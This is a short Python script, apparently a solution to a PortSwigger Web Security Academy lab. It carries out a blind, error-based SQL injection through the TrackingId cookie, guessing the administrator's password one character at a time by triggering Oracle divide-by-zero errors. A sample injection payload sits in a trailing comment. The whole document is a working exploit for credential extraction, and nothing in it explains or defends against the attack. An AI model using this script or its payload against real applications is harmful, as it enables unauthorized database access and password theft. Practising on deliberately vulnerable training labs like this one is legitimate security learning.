import requests
import string


url = "https://{your-instance}.web-security-academy.net/"

alphabet = string.ascii_lowercase + "1234567890"

payload = ""
password = ""
num=1

s = requests.Session()

while True:
    for i in alphabet:
        payload = password + i

        track = {
            "TrackingId": f"your-token' UNION SELECT CASE WHEN (Username = 'administrator' AND SUBSTR(Password, 1, {num}) = '{payload}') THEN TO_CHAR(1/0) ELSE NULL END FROM users--"  
        }   
        
        print(track)
        r = s.get(url,cookies=track)
        if r.status_code == 500:
            password = password + i
            print(i, "||", "True")
            num     += 1
        else:
            print("False", print(r.status_code))


#S9nljSP73LcwoLgN' UNION SELECT CASE WHEN (Username = 'administrator' AND SUBSTR(Password, 1, 1) = 'm') THEN TO_CHAR(1/0) ELSE NULL END FROM users--
